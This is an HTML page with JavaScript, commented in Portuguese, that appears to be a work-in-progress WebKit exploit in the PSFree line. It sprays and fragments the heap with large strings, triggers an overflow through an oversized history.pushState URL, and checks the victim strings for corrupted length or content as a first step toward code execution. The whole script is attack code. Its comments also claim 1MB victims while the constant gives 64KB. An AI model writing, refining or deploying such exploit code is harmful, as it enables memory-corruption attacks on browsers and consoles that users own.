<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: Decoder Clash 256</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; }
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #ff0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
    </style>
</head>
<body>

    <h1>Técnica Final: Decoder Clash</h1>
    <p>Alinhando Size Classes usando TextDecoder para Strings de 1MB.</p>

    <button onclick="startDecoderAttack()">INICIAR ALINHAMENTO PERFEITO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // O Offset que descobrimos (Header Boundary)
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // ALINHAMENTO DE CLASSE DE TAMANHO (O Segredo)
        // O pushState aloca ~1MB. Precisamos de vítimas de ~1MB.
        // JS Strings têm um header de aprox 24 bytes.
        const TARGET_SIZE =  256 * 256; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startDecoderAttack() {
            log(`Criando vítimas de 1MB usando TextDecoder (8-bit force)...`);

            // 1. Preparar o Buffer de origem
            // Enchemos de 'B' (0x42)
            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
            rawBuffer.fill(0x42);
            
            // TextDecoder força a criação de uma string Flat de 8 bits
            // Isso imita o comportamento de memória do pushState
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            // 2. SPRAY (Encher o Large Heap)
            // Não precisamos de muitos, pois são gigantes
            const SPRAY_COUNT = 80; 
            
            for(let i=0; i<SPRAY_COUNT; i++) {
                // Adiciona um prefixo único para impedir que o WebKit deduplique as strings
                // (Se as strings forem iguais, ele aponta todas para a mesma memória)
                let s = i + "_" + baseString.substring((i+"_").length);
                victims.push(s);
            }

            // 3. BURACOS (Feng Shui)
            log("Abrindo buracos no Large Heap...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null;
            }

            // Força GC pesado
            await forceGC();

            // 4. EXPLOIT
            log("Disparando Overflow (Tentando ocupar o buraco)...");
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "pwn", "/" + buffer);

                    log("Verificando corrupção...");
                    checkVictims(PAYLOAD_SIZE);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkVictims(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // TRUQUE DO PSFREE: Usar Error para ler
                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // Checa Tamanho
                    if (msg.length !== expectedLen) {
                        log(`!!! SUCESSO (LENGTH) !!! String ${i}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`);
                        alert("RCE STEP 1: LENGTH CORRUPTED!");
                        success = true;
                        break;
                    }

                    // Checa Conteúdo (Byte 0x01)
                    if (msg.charCodeAt(0) !== 66) { // 66 = 'B'
                        log(`!!! SUCESSO (CONTENT) !!! String ${i} sobrescrita!`, 'win');
                        alert("RCE STEP 1: DATA CORRUPTED!");
                        success = true;
                        break;
                    }
                } catch(e) {
                    // Se der erro ao ler, pode ser um bom sinal (ponteiro inválido)
                    log(`Erro ao ler vítima ${i}: ${e.message}`);
                }
            }
            if(!success) log("Nenhuma string atingida. Isolamento persiste.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
